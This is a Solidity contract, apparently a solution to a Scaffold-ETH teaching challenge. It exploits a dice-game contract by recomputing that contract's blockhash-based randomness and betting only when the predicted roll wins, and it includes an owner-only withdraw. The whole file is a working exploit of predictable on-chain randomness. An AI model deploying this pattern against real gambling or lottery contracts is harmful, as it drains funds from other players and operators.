pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function riggedRoll() public payable {
        uint256 amount = 2000000000000000;
        require(
            address(this).balance >= amount,
            "Require more ETH to roll dice"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        console.log("THE PREDICTED ROLL IS ", roll);
        if (roll > 2) {
            return;
        }
        diceGame.rollTheDice{value: amount}();
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");

        require(sent, "Error in transfer");
    }

    receive() external payable {}
}
